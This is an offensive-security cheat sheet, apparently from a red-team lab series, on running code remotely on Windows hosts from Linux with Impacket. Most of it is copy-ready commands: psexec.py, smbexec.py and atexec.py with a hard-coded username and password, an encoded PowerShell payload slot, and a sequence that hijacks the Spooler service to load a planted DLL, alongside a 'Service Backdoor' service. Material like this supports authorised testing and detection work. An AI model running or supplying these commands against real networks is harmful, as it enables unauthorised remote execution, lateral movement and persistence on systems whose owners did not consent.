# 05.03 Impacket Remote Execution Linux

> Drive remote code execution from Linux with `psexec.py`, `smbexec.py`, `atexec.py`, or `impacket-services` — each leaves a different trail.

## Overview

impacket-services manipulates Windows services for payload delivery. psexec.py/smbexec.py/atexec.py provide different execution mechanisms, each with different detection profiles.

## Steps

- **psexec.py** — uploads binary, creates service; noisiest.
- **smbexec.py** — creates service on-the-fly, no binary upload.
- **atexec.py** — AT job execution.
- **impacket-services change -path** — hijack existing service binary.

## Commands

### psexec / smbexec / atexec

```bash
proxychains4 -q psexec.py <DOMAIN>/helen:'RedRiot88'@172.20.0.52
proxychains4 -q smbexec.py <DOMAIN>/helen:'RedRiot88'@172.20.0.52
proxychains4 -q atexec.py <DOMAIN>/helen:'RedRiot88'@172.20.0.52 "powershell -e BASE64"
```

### impacket-services service hijack

```bash
proxychains4 -q impacket-services <DOMAIN>/helen:'RedRiot88'@172.20.0.52 start -name 'Service Backdoor'
proxychains4 -q impacket-services <DOMAIN>/helen:'RedRiot88'@172.20.0.52 config -name Spooler
proxychains4 -q impacket-services <DOMAIN>/helen:'RedRiot88'@172.20.0.52 change -name Spooler -path "c:\windows\system32\spool\drivers\x64\3\BrEIX64b.dll"
proxychains4 -q impacket-services <DOMAIN>/helen:'RedRiot88'@172.20.0.52 start -name Spooler
```
